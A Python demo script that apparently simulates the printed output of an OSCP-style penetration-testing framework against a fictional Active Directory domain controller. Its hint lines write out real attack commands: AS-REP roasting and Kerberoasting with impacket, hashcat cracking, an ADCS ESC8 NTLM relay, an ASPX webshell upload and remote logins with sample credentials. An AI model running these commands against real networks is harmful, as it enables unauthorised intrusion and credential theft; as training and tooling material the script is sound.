"""
demo.py — Simulates a full OSCP framework run against a fictional target.

Calls every display function in the exact order and context the real engine
would call them, with realistic delays so the output appears to stream in
real time just as it would during a live scan.
"""

import time
import sys
sys.path.insert(0, ".")

from core.display import (
    banner, info, success, warn, error, hint,
    module_start, module_done, status_line,
)
from rich.console import Console

console = Console()

# ── Timing helpers ────────────────────────────────────────────────────────────

def _pause(seconds: float) -> None:
    time.sleep(seconds)

def _stream(lines: list[tuple[str, float]]) -> None:
    """Print (tag, text, delay) tuples one at a time."""
    for tag, text, delay in lines:
        if   tag == "info":    info(text)
        elif tag == "success": success(text)
        elif tag == "warn":    warn(text)
        elif tag == "error":   error(text)
        _pause(delay)


# ── Demo ──────────────────────────────────────────────────────────────────────

def run_demo() -> None:
    START = time.time()
    TARGET = "10.10.11.42"

    # ── Banner ────────────────────────────────────────────────────────────────
    banner()
    _pause(0.4)

    # ── Engine startup ────────────────────────────────────────────────────────
    console.print(
        "[bold red]━[/bold red]" * 44
    )
    console.print()
    console.print(
        "  [bold white]Target :[/bold white] [bold cyan]10.10.11.42[/bold cyan]\n"
        "  [bold white]Domain :[/bold white] [bold cyan]corp.local[/bold cyan]\n"
        "  [bold white]Output :[/bold white] [dim]output/targets/10.10.11.42[/dim]\n"
        "  [bold white]LHOST  :[/bold white] [bold green]10.10.14.5[/bold green]"
        "  [dim](Arsenal Recommender)[/dim]"
    )
    console.print()
    _pause(0.3)

    # ── TTL OS detection ──────────────────────────────────────────────────────
    info("> ping -c 1 -W 2 10.10.11.42")
    _pause(0.6)
    success("TTL=127 → OS Guess: Windows")
    console.print()
    _pause(0.3)

    # ── Phase 1: Initial Nmap recon ───────────────────────────────────────────
    console.rule("[bold blue] PHASE 1 — INITIAL RECON [/bold blue]")
    _pause(0.2)
    info("> bash wrappers/recon.sh --target 10.10.11.42 --output-dir output/targets/10.10.11.42 --domain corp.local")
    _pause(0.5)

    nmap_lines = [
        ("info",    "Starting Nmap 7.94 ( https://nmap.org )",                          0.4),
        ("info",    "Nmap scan report for 10.10.11.42",                                  0.3),
        ("info",    "PORT      STATE SERVICE       VERSION",                              0.2),
        ("success", "53/tcp    open  domain        Simple DNS Plus",                     0.25),
        ("success", "80/tcp    open  http          Microsoft IIS httpd 10.0",            0.25),
        ("success", "88/tcp    open  kerberos-sec  Microsoft Windows Kerberos",          0.25),
        ("success", "135/tcp   open  msrpc         Microsoft Windows RPC",               0.25),
        ("success", "139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn",      0.25),
        ("success", "389/tcp   open  ldap          Microsoft Windows Active Directory",  0.25),
        ("success", "443/tcp   open  https         Microsoft IIS httpd 10.0",            0.25),
        ("success", "445/tcp   open  microsoft-ds  Windows Server 2019 microsoft-ds",   0.25),
        ("success", "464/tcp   open  kpasswd5",                                          0.25),
        ("success", "593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP",     0.25),
        ("success", "636/tcp   open  ldapssl       Microsoft Windows Active Directory",  0.25),
        ("success", "3268/tcp  open  ldap          Microsoft Windows Active Directory",  0.25),
        ("success", "3269/tcp  open  globalcatLDAP Microsoft Windows Active Directory",  0.25),
        ("success", "3389/tcp  open  ms-wbt-server Microsoft Terminal Services",        0.25),
        ("success", "5985/tcp  open  wsman         Microsoft HTTPAPI httpd 2.0",        0.25),
        ("info",    "Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows", 0.3),
        ("info",    "Nmap done: 1 IP address (1 host up) scanned in 18.42 seconds",     0.4),
    ]
    _stream(nmap_lines)

    success("DC confirmed via LDAP banner on port 389")
    success("Domain Controller inferred: Kerberos (88) + LDAP/GC ports open")
    _pause(0.3)
    info(f"[*] Background NSE vuln scan running (PID 14321) — you'll be notified when it completes.")
    _pause(0.4)

    # ── Phase 2: Tier separators ──────────────────────────────────────────────
    console.print()
    console.rule("[bold green] TIER 1 — LIGHTNING FAST (smb · ftp · ldap · dns · snmp · nfs · services) [/bold green]")
    console.print()
    _pause(0.3)

    # ── SMB ───────────────────────────────────────────────────────────────────
    module_start("SMB")
    _pause(0.3)
    info("> bash wrappers/smb_enum.sh --target 10.10.11.42 --output-dir output/targets/10.10.11.42")
    _pause(0.4)

    _stream([
        ("info",    "Checking SMB signing...",                                0.35),
        ("warn",    "SMB signing DISABLED on 10.10.11.42 — relay attacks possible", 0.3),
        ("info",    "Enumerating shares (null session)...",                   0.4),
        ("success", "Share: SYSVOL      READ",                                    0.25),
        ("success", "Share: NETLOGON    READ",                                    0.25),
        ("success", "Share: Data        READ WRITE",                              0.25),
        ("success", "Share: IPC$        READ",                                    0.25),
        ("info",    "Checking for anonymous access on Data...",               0.4),
        ("success", "Anonymous READ on \\\\10.10.11.42\\Data",                    0.3),
        ("success", "Found file: \\Data\\HR\\credentials.bak (4.2 KB)",          0.3),
        ("success", "Found file: \\Data\\IT\\vpn_config.ovpn (1.8 KB)",          0.3),
    ])

    module_done("SMB")
    console.print("  completed in [cyan]23s[/cyan]")
    _pause(0.3)

    # ── LDAP ──────────────────────────────────────────────────────────────────
    module_start("LDAP")
    _pause(0.3)
    info("> bash wrappers/ldap_enum.sh --target 10.10.11.42 --domain corp.local --output-dir output/targets/10.10.11.42")
    _pause(0.4)

    _stream([
        ("info",    "Attempting anonymous LDAP bind...",                      0.35),
        ("success", "Anonymous bind succeeded on ldap://10.10.11.42:389",        0.3),
        ("success", "Base DN: DC=corp,DC=local",                                  0.25),
        ("info",    "Extracting users...",                                    0.4),
        ("success", "Found 47 user objects",                                      0.25),
        ("success", "User: Administrator  (active)",                              0.2),
        ("success", "User: svc_backup     (active, password never expires)",     0.2),
        ("success", "User: svc_sql        (active, SPN: MSSQLSvc/dc01.corp.local)", 0.2),
        ("success", "User: jsmith         (active)",                              0.2),
        ("success", "User: tbrown         (active, DONT_REQUIRE_PREAUTH)",       0.2),
        ("warn",    "tbrown has UF_DONT_REQUIRE_PREAUTH — AS-REP roastable!",    0.3),
        ("info",    "Checking for Kerberoastable accounts...",               0.35),
        ("success", "Kerberoastable SPN: svc_sql / MSSQLSvc/dc01.corp.local",   0.3),
        ("info",    "Running kerbrute userenum...",                          0.4),
        ("success", "Valid user: administrator@corp.local",                      0.2),
        ("success", "Valid user: jsmith@corp.local",                             0.2),
        ("success", "Valid user: tbrown@corp.local",                             0.2),
        ("success", "Valid user: svc_sql@corp.local",                            0.2),
        ("success", "Valid user: svc_backup@corp.local",                         0.2),
        ("info",    "5 valid users written to output/targets/10.10.11.42/ldap/valid_users.txt", 0.3),
    ])

    hint(
        "impacket-GetNPUsers corp.local/ -usersfile output/targets/10.10.11.42/ldap/valid_users.txt "
        "-no-pass -dc-ip 10.10.11.42 -outputfile asrep_hashes.txt"
    )
    _pause(0.2)
    hint(
        "impacket-GetUserSPNs corp.local/jsmith:Password123 -dc-ip 10.10.11.42 "
        "-request -outputfile kerberoast_hashes.txt"
    )

    module_done("LDAP")
    console.print("  completed in [cyan]41s[/cyan]")
    _pause(0.3)

    # ── DNS ───────────────────────────────────────────────────────────────────
    module_start("DNS")
    _pause(0.3)
    info("> bash wrappers/dns_enum.sh --target 10.10.11.42 --domain corp.local --output-dir output/targets/10.10.11.42")
    _pause(0.4)

    _stream([
        ("info",    "Zone transfer attempt on corp.local...",                 0.35),
        ("warn",    "Zone transfer refused by 10.10.11.42",                       0.3),
        ("info",    "Resolving common hostnames...",                          0.35),
        ("success", "dc01.corp.local       → 10.10.11.42",                       0.2),
        ("success", "mail.corp.local       → 10.10.11.50",                       0.2),
        ("success", "dev.corp.local        → 10.10.11.55",                       0.2),
        ("success", "intranet.corp.local   → 10.10.11.42",                       0.2),
    ])

    module_done("DNS")
    console.print("  completed in [cyan]12s[/cyan]")
    _pause(0.3)

    # ── Services ──────────────────────────────────────────────────────────────
    module_start("SERVICES")
    _pause(0.3)
    info("> bash wrappers/services_enum.sh --target 10.10.11.42 --output-dir output/targets/10.10.11.42")
    _pause(0.4)

    _stream([
        ("info",    "Checking SSH (port 22)... not open",                    0.3),
        ("info",    "Checking WinRM (port 5985)...",                         0.35),
        ("success", "WinRM open — try evil-winrm if you have credentials",       0.3),
        ("info",    "Enumerating RPC endpoints (port 135)...",               0.4),
        ("success", "MSRPC endpoint: epmapper (UUID 6BFFD098-A112-3610-9833-46C3F87E345A)", 0.2),
        ("success", "MSRPC endpoint: RemoteRegistry (UUID 338CD001-2244-31F1-AAAA-900038001003)", 0.2),
    ])

    module_done("SERVICES")
    console.print("  completed in [cyan]18s[/cyan]")
    _pause(0.3)

    # ── Tier 2 ────────────────────────────────────────────────────────────────
    console.print()
    console.rule("[bold yellow] TIER 2 — MEDIUM (databases · remote · mail) [/bold yellow]")
    console.print()
    _pause(0.3)

    # ── Remote ────────────────────────────────────────────────────────────────
    module_start("REMOTE")
    _pause(0.3)
    info("> bash wrappers/remote_enum.sh --target 10.10.11.42 --output-dir output/targets/10.10.11.42")
    _pause(0.4)

    _stream([
        ("info",    "Checking RDP (port 3389)...",                           0.35),
        ("success", "RDP open — NLA required",                                   0.3),
        ("info",    "Grabbing RDP certificate...",                           0.35),
        ("success", "RDP cert CN: DC01.corp.local",                              0.3),
        ("info",    "Checking VNC ports... none open",                       0.3),
    ])

    hint("xfreerdp /u:jsmith /p:'Password123' /v:10.10.11.42 /cert:ignore")

    module_done("REMOTE")
    console.print("  completed in [cyan]9s[/cyan]")
    _pause(0.3)

    # ── Tier 3 ────────────────────────────────────────────────────────────────
    console.print()
    console.rule("[bold red] TIER 3 — HEAVY (web enumeration — always last) [/bold red]")
    console.print()
    _pause(0.3)

    # ── Web (port 80) ─────────────────────────────────────────────────────────
    module_start("WEB")
    _pause(0.3)

    info("> bash wrappers/web_enum.sh --target 10.10.11.42 --port 80 --output-dir output/targets/10.10.11.42")
    _pause(0.4)

    _stream([
        ("info",    "Whatweb fingerprint on http://10.10.11.42:80...",       0.35),
        ("success", "IIS/10.0  ASP.NET/4.0  Windows",                           0.3),
        ("info",    "Feroxbuster directory brute-force on port 80...",       0.4),
        ("success", "/login         [302 → /login.aspx]",                        0.2),
        ("success", "/admin         [302 → /login.aspx]",                        0.2),
        ("success", "/upload        [200]  (1.4 KB)",                            0.2),
        ("success", "/api           [200]  (JSON)",                              0.2),
        ("success", "/api/v1/users  [200]  (JSON, 47 entries)",                  0.2),
        ("warn",    "/upload endpoint accepts arbitrary file extensions",         0.3),
        ("info",    "Nikto scan on http://10.10.11.42:80...",               0.4),
        ("warn",    "Nikto: X-Frame-Options header not set",                     0.25),
        ("warn",    "Nikto: Server leaks version via 'Server' header: IIS/10.0", 0.25),
    ])

    hint(
        "# File upload — try ASPX webshell:\n"
        "curl -F 'file=@shell.aspx' http://10.10.11.42/upload\n"
        "# then curl http://10.10.11.42/upload/shell.aspx?cmd=whoami"
    )

    info("> bash wrappers/web_enum.sh --target 10.10.11.42 --port 443 --output-dir output/targets/10.10.11.42")
    _pause(0.4)

    _stream([
        ("info",    "Feroxbuster on https://10.10.11.42:443...",             0.35),
        ("success", "/certsrv       [200]  (ADCS Certificate Services)",        0.3),
        ("warn",    "ADCS web enrollment exposed — check for ESC1/ESC8",        0.3),
    ])

    hint(
        "# ADCS ESC8 — NTLM relay to certificate endpoint:\n"
        "impacket-ntlmrelayx -t http://10.10.11.42/certsrv/certfnsh.asp "
        "--adcs --template DomainController"
    )

    module_done("WEB")
    console.print("  completed in [cyan]3m 14s[/cyan]")
    _pause(0.3)

    # ── NSE vuln scan finished alert ──────────────────────────────────────────
    console.print()
    console.rule("[bold yellow] 🔔  DING!  Background NSE Vuln Scan Finished  🔔 [/bold yellow]", style="yellow")
    console.print("  [bold white]Check [cyan]output/targets/10.10.11.42/scans/vulns.txt[/cyan] for critical findings.[/bold white]")
    console.rule(style="yellow")
    console.print()
    _pause(0.3)

    # ── Recommender summary ───────────────────────────────────────────────────
    console.rule("[bold cyan] ARSENAL RECOMMENDER — NEXT STEPS [/bold cyan]")
    console.print()

    success("SMB relay viable (signing disabled) — run Responder + ntlmrelayx")
    success("AS-REP roast: tbrown has DONT_REQUIRE_PREAUTH")
    success("Kerberoast: svc_sql has registered SPN")
    success("ADCS web enrollment exposed on port 443 — ESC8 likely")
    success("Anonymous SMB share \\\\Data contains credentials.bak")

    hint(
        "# Step 1 — grab AS-REP hash:\n"
        "impacket-GetNPUsers corp.local/tbrown -no-pass -dc-ip 10.10.11.42\n\n"
        "# Step 2 — crack it:\n"
        "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt\n\n"
        "# Step 3 — Kerberoast with recovered creds:\n"
        "impacket-GetUserSPNs corp.local/tbrown:<cracked> -dc-ip 10.10.11.42 -request"
    )

    hint(
        "# ADCS ESC8 — relay DC machine account cert request:\n"
        "sudo impacket-ntlmrelayx -t http://10.10.11.42/certsrv/certfnsh.asp \\\n"
        "    --adcs --template DomainController -smb2support\n"
        "# Then trigger auth with PetitPotam or PrinterBug"
    )

    hint(
        "# WinRM with recovered creds:\n"
        "evil-winrm -i 10.10.11.42 -u tbrown -p '<cracked_password>'"
    )

    # ── Final status line ─────────────────────────────────────────────────────
    elapsed = time.time() - START
    total = int(elapsed)
    mins, secs = total // 60, total % 60
    elapsed_str = f"{mins}m {secs:02d}s" if mins else f"{secs}s"
    status_line(TARGET, "session complete", elapsed_str)


if __name__ == "__main__":
    run_demo()
